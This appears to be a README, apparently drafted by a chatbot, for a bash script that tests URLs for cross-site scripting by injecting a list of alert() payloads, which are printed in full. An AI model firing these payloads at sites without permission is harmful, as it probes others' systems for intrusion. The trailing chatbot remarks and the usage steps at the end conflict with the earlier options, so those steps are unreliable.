# XSS-Testing-Script

Here’s a **README.md** for the enhanced XSS testing script:

---

# XSS Testing Script

This script is designed to automate the testing of **Cross-Site Scripting (XSS)** vulnerabilities on a single URL or a list of URLs. The script can use default or custom XSS payloads and save the results in a file for later analysis. It is intended for security researchers, penetration testers, and bug bounty hunters.

## Features

- **Test Single or Multiple URLs**:
  - Test a single URL.
  - Test multiple URLs from a file.
  
- **Default and Custom Payloads**:
  - Use a set of default XSS payloads.
  - Specify custom payloads from a separate file.
  
- **Output**:
  - Results are saved to a timestamped file for easy tracking.
  - Clear, color-coded output in the terminal.

## Requirements

- **bash** (Linux/Mac)
- **curl** (for HTTP requests)
- **jq** (for URL encoding)

Make sure you have **jq** installed:
```bash
sudo apt-get install jq      # For Debian/Ubuntu
sudo yum install jq          # For CentOS/RHEL
```

## Installation

1. **Clone or Download the Script**:
   ```bash
git clone https://github.com/abdullah89255/XSS-Testing-Script
```

2. **Make the Script Executable**:
   ```bash
   chmod +x xss_test.sh
   chmod +x * 
   ```

## Usage

### Basic Command Structure
```bash
./xss_test.sh [options]
```

### Options

- `-u <url>`: **Test a single URL** for XSS vulnerabilities.
  - Example:
    ```bash
    ./xss_test.sh -u "https://example.com/search?q="
    ```

- `-f <file>`: **Test multiple URLs** from a file. Each URL should be on a new line in the file.
  - Example:
    ```bash
    ./xss_test.sh -f urls.txt
    ```

- `-p <payloads_file>`: Use **custom payloads** from a file. If not specified, the script uses the default payloads.
  - Example:
    ```bash
    ./xss_test.sh -u "https://example.com/search?q=" -p payloads.txt
    ```

- `-o <output_file>`: **Specify the output file** for saving results. By default, the results are saved with a timestamp.
  - Example:
    ```bash
    ./xss_test.sh -u "https://example.com/search?q=" -o custom_results.txt
    ```

- `-h`: Show the **help message**.

### Example Usage

1. **Test a Single URL**:
   ```bash
   ./xss_test.sh -u "https://example.com/search?q="
   ```

2. **Test Multiple URLs from a File**:
   ```bash
   ./xss_test.sh -f urls.txt
   ```

3. **Use Custom Payloads**:
   ```bash
   ./xss_test.sh -u "https://example.com/search?q=" -p custom_payloads.txt
   ```

4. **Save Results to a Custom File**:
   ```bash
   ./xss_test.sh -f urls.txt -o custom_results.txt
   ```

5. **Show Help**:
   ```bash
   ./xss_test.sh -h
   ```

## Default Payloads

The script comes with the following **default XSS payloads**:

```plaintext
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg/onload=alert('XSS')>
<iframe src=javascript:alert('XSS')></iframe>
';alert('XSS');// 
";alert('XSS');// 
<body onload=alert('XSS')>
<marquee onstart=alert('XSS')>
<input autofocus onfocus=alert('XSS')>
<details open ontoggle=alert('XSS')>
```

### Custom Payloads File

If you want to use your own set of payloads, create a file (`payloads.txt`) with one payload per line:

```plaintext
<script>alert('Custom XSS')</script>
<img src=x onerror=alert('Custom XSS')>
```

You can pass this file to the script using the `-p` option.

## Output Format

Results are saved to a file. The script will indicate if a payload was successful or not with a message:

```plaintext
[+] Vulnerable: https://example.com/search?q=<script>alert('XSS')</script> with payload: <script>alert('XSS')</script>
[-] Not vulnerable: https://example.com/search?q=<svg/onload=alert('XSS')> with payload: <svg/onload=alert('XSS')>
```

If no vulnerabilities are found, you will see the "Not vulnerable" message for each URL tested.

## Example Output

```
============================================
        Starting XSS Testing Script         
============================================
Testing single URL...
Testing URL: https://example.com/search?q=<script>alert('XSS')</script>
[+] Vulnerable: https://example.com/search?q=<script>alert('XSS')</script> with payload: <script>alert('XSS')</script>
Testing URL: https://example.com/search?q=<img src=x onerror=alert('XSS')>
[-] Not vulnerable: https://example.com/search?q=<img src=x onerror=alert('XSS')> with payload: <img src=x onerror=alert('XSS')>

============================================
XSS Testing Completed. Results saved to:
xss_results_20250204_115234.txt
============================================
```

## Contributing

Feel free to **fork** the repository and submit **pull requests** with improvements, bug fixes, or additional features.

## License

This script is open source and released under the **MIT License**.

---

### Let me know if you'd like further changes to this README or script!
Would you like additional enhancements such as **parallel execution** or **HTML output reports**?

### **Steps to Use the Script**
1. Save the script as `xss_test02.sh`.
2. Make the script executable:
   ```bash
   chmod +x xss_test02.sh
   ```
3. Run the script with the target URL and parameter:
   ```bash
   ./xss_test.sh "https://example.com/search" "query"
   ```

